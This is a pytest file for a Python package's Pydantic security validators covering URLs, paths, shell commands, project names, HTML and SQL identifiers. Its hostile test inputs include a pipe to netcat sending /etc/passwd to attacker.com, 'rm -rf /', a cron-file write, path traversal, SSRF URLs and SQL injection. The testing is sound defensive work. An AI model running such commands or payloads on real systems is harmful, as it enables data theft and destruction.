"""Tests for Pydantic v2 security type aliases (security/types.py)."""

import pytest
from hypothesis import given
from hypothesis import strategies as st
from pydantic import BaseModel, ValidationError

from taipanstack.security.types import (
    SafeCommand,
    SafeHtml,
    SafePath,
    SafeProjectName,
    SafeSqlIdentifier,
    SafeUrl,
)

# ---------------------------------------------------------------------------
# SafeUrl
# ---------------------------------------------------------------------------


class UrlModel(BaseModel):
    """Model using SafeUrl."""

    url: SafeUrl


class TestSafeUrl:
    """Tests for SafeUrl Pydantic type."""

    def test_valid_public_url_passes(self) -> None:
        """A well-formed public HTTPS URL passes validation."""
        # Using a well-known public domain that DNS resolves to a public IP
        # Guard against environments with no network by catching ValidationError
        try:
            m = UrlModel(url="https://example.com")
            assert m.url == "https://example.com"
        except ValidationError:
            pytest.skip("Network not available in this environment")

    def test_loopback_url_raises_validation_error(self) -> None:
        """A URL resolving to a loopback address raises ValidationError (SSRF)."""
        with pytest.raises(ValidationError) as exc_info:
            UrlModel(url="http://127.0.0.1/admin")
        errors = exc_info.value.errors()
        assert len(errors) >= 1

    def test_private_ip_url_raises_validation_error(self) -> None:
        """A URL pointing to a private IP raises ValidationError (SSRF)."""
        with pytest.raises(ValidationError):
            UrlModel(url="http://192.168.1.1/secret")

    def test_metadata_endpoint_raises_validation_error(self) -> None:
        """AWS metadata endpoint raises ValidationError (SSRF)."""
        with pytest.raises(ValidationError):
            UrlModel(url="http://169.254.169.254/latest/meta-data/")

    def test_invalid_scheme_raises_validation_error(self) -> None:
        """A non-http/https scheme raises ValidationError."""
        with pytest.raises(ValidationError):
            UrlModel(url="ftp://example.com/file.txt")

    def test_empty_string_raises_validation_error(self) -> None:
        """An empty URL raises ValidationError."""
        with pytest.raises(ValidationError):
            UrlModel(url="")

    def test_no_domain_raises_validation_error(self) -> None:
        """URL without domain raises ValidationError."""
        with pytest.raises(ValidationError):
            UrlModel(url="https://")

    def test_link_local_address_raises_validation_error(self) -> None:
        """Link-local IP address raises ValidationError (SSRF)."""
        with pytest.raises(ValidationError):
            UrlModel(url="http://169.254.0.1/data")


# ---------------------------------------------------------------------------
# SafePath
# ---------------------------------------------------------------------------


class PathModel(BaseModel):
    """Model using SafePath."""

    path: SafePath


class TestSafePath:
    """Tests for SafePath Pydantic type."""

    def test_simple_path_passes(self) -> None:
        """A path without traversal markers passes validation."""
        m = PathModel(path="uploads/image.png")
        assert m.path == "uploads/image.png"

    def test_path_traversal_dotdot_raises(self) -> None:
        """Path containing '..' raises ValidationError."""
        with pytest.raises(ValidationError) as exc_info:
            PathModel(path="../etc/passwd")
        errors = exc_info.value.errors()
        assert len(errors) >= 1

    def test_encoded_traversal_raises(self) -> None:
        """URL-encoded path traversal raises ValidationError."""
        with pytest.raises(ValidationError):
            PathModel(path="%2e%2e/etc/shadow")

    def test_tilde_traversal_raises(self) -> None:
        """Tilde in path raises ValidationError."""
        with pytest.raises(ValidationError):
            PathModel(path="~/secrets")

    def test_absolute_path_in_base_passes(self) -> None:
        """Absolute path within cwd passes validation."""
        import pathlib

        safe_path = str(pathlib.Path.cwd() / "somefile.txt")
        m = PathModel(path=safe_path)
        assert m.path == safe_path


# ---------------------------------------------------------------------------
# SafeCommand
# ---------------------------------------------------------------------------


class CommandModel(BaseModel):
    """Model using SafeCommand."""

    command: SafeCommand


class TestSafeCommand:
    """Tests for SafeCommand Pydantic type."""

    def test_simple_command_passes(self) -> None:
        """A benign command string passes validation."""
        m = CommandModel(command="ls")
        assert m.command == "ls"

    def test_command_with_semicolon_raises(self) -> None:
        """Command containing semicolon raises ValidationError."""
        with pytest.raises(ValidationError) as exc_info:
            CommandModel(command="ls; rm -rf /")
        errors = exc_info.value.errors()
        assert len(errors) >= 1

    def test_command_with_pipe_raises(self) -> None:
        """Command containing pipe raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="cat /etc/passwd | nc attacker.com 80")

    def test_command_with_dollar_raises(self) -> None:
        """Command containing variable expansion raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="echo $SECRET")

    def test_command_with_backtick_raises(self) -> None:
        """Command containing backtick substitution raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="echo `id`")

    def test_command_with_ampersand_raises(self) -> None:
        """Command containing ampersand raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="sleep 100 & disown")

    def test_command_with_redirect_raises(self) -> None:
        """Command containing output redirect raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="echo hacked > /etc/cron.d/pwn")


# ---------------------------------------------------------------------------
# SafeProjectName
# ---------------------------------------------------------------------------


class ProjectModel(BaseModel):
    """Model using SafeProjectName."""

    name: SafeProjectName


class TestSafeProjectName:
    """Tests for SafeProjectName Pydantic type."""

    def test_valid_name_passes(self) -> None:
        """A valid project name passes validation."""
        m = ProjectModel(name="my_project")
        assert m.name == "my_project"

    def test_valid_name_with_hyphens_passes(self) -> None:
        """A project name with hyphens passes validation."""
        m = ProjectModel(name="my-project")
        assert m.name == "my-project"

    def test_empty_name_raises(self) -> None:
        """Empty project name raises ValidationError."""
        with pytest.raises(ValidationError) as exc_info:
            ProjectModel(name="")
        errors = exc_info.value.errors()
        assert len(errors) >= 1

    def test_name_starting_with_digit_raises(self) -> None:
        """Project name starting with a digit raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="123project")

    def test_reserved_name_raises(self) -> None:
        """Reserved project name raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="test")

    def test_name_with_spaces_raises(self) -> None:
        """Project name containing spaces raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="my project")

    def test_name_too_long_raises(self) -> None:
        """Project name exceeding max length raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="a" * 101)


# ---------------------------------------------------------------------------
# SafeHtml
# ---------------------------------------------------------------------------


class HtmlModel(BaseModel):
    """Model using SafeHtml."""

    content: SafeHtml


class TestSafeHtml:
    """Tests for SafeHtml Pydantic type."""

    def test_basic_escape(self) -> None:
        """Basic HTML strings are escaped properly."""
        m = HtmlModel(content="<script>alert(1)</script>")
        assert m.content == "&lt;script&gt;alert(1)&lt;/script&gt;"

    @given(st.text())
    def test_property_all_strings_escaped(self, text: str) -> None:
        """All arbitrary text is safely processed."""
        # Using html.escape, the characters <, >, &, ", ' are escaped
        # unless quote=False is passed (we use default quote=True)
        m = HtmlModel(content=text)
        assert "<" not in m.content
        assert ">" not in m.content


# ---------------------------------------------------------------------------
# SafeSqlIdentifier
# ---------------------------------------------------------------------------


class SqlModel(BaseModel):
    """Model using SafeSqlIdentifier."""

    column: SafeSqlIdentifier


class TestSafeSqlIdentifier:
    """Tests for SafeSqlIdentifier Pydantic type."""

    def test_valid_identifier_passes(self) -> None:
        """Valid SQL identifiers pass validation."""
        assert SqlModel(column="users_table").column == "users_table"
        assert SqlModel(column="_private1").column == "_private1"

    def test_invalid_identifier_raises(self) -> None:
        """Invalid SQL identifiers raise ValidationError."""
        with pytest.raises(ValidationError):
            SqlModel(column="user table")
        with pytest.raises(ValidationError):
            SqlModel(column="1table")
        with pytest.raises(ValidationError):
            SqlModel(column="users; DROP TABLE users")

    @given(st.from_regex(r"^[a-zA-Z_][a-zA-Z0-9_]*$", fullmatch=True))
    def test_property_valid_identifiers_pass(self, text: str) -> None:
        """Valid generated identifiers pass."""
        assert SqlModel(column=text).column == text

    @given(st.text())
    def test_property_any_string_validation(self, text: str) -> None:
        """Arbitrary strings are correctly accepted or rejected based on regex."""
        import re

        is_valid = bool(re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", text))
        if is_valid:
            assert SqlModel(column=text).column == text
        else:
            with pytest.raises(ValidationError):
                SqlModel(column=text)


